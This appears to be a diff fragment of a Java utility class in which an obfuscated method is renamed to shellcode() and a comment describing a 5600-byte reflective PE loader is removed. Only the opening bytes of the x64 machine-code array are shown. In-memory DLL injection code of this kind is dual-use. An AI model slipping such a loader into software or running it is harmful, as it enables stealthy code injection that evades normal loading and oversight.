@@ -1,17 +1,9 @@
 package io.github.seraphina.utility.win;
 
-/**
- * Auto-generated reflective PE loader shellcode.
- * Size: 5600 bytes (0x15E0)
- *
- * Magic placeholders:
- *   MAGIC_DLL_PATH = 0x1122334455667788
- *   MAGIC_LOCK     = 0x9988776655443322
- */
 public class WIN32 {
     public static final int SIZE = 5600;
 
-    public byte[] llIIll01l() {
+    public byte[] shellcode() {
         return new byte[] {
             (byte)0x48, (byte)0x89, (byte)0x5C, (byte)0x24, (byte)0x08, (byte)0x55, (byte)0x56, (byte)0x57, (byte)0x41, (byte)0x54, (byte)0x41, (byte)0x55, (byte)0x41, (byte)0x56, (byte)0x41, (byte)0x57,
             (byte)0x48, (byte)0x8D, (byte)0xAC, (byte)0x24, (byte)0x50, (byte)0xFE, (byte)0xFF, (byte)0xFF, (byte)0x48, (byte)0x81, (byte)0xEC, (byte)0xB0, (byte)0x02, (byte)0x00, (byte)0x00, (byte)0x48,
